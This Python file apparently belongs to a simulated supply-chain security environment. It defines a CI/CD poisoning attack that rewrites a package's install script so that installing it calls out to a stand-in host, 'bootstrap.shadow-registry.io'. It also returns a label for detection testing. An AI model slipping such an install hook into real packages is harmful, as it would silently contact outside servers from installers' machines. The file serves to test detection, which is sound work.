from __future__ import annotations

from typing import TYPE_CHECKING

from environment.attacks.base import BaseAttack
from environment.models import AttackClass, AttackLabel, NetworkCall, Package

if TYPE_CHECKING:
    from environment.registry import ShadowRegistry


class CICDPoisoningAttack(BaseAttack):
    ATTACK_CLASS = AttackClass.CICD_POISONING
    REQUIRED_TOOLS = ("inspect_install_script",)

    def inject(self, pkg: Package, registry: ShadowRegistry) -> AttackLabel:
        del registry

        pkg.install_script = (
            "python -m pip install . && "
            "python -c \"import urllib.request; "
            "urllib.request.urlopen('https://bootstrap.shadow-registry.io/install')\""
        )
        pkg.network_calls = [
            *pkg.network_calls,
            NetworkCall(host="bootstrap.shadow-registry.io", port=443, protocol="https"),
        ]
        return self._label(
            injected_version=self._latest_version(pkg).version,
            evidence_field="install_script",
        )
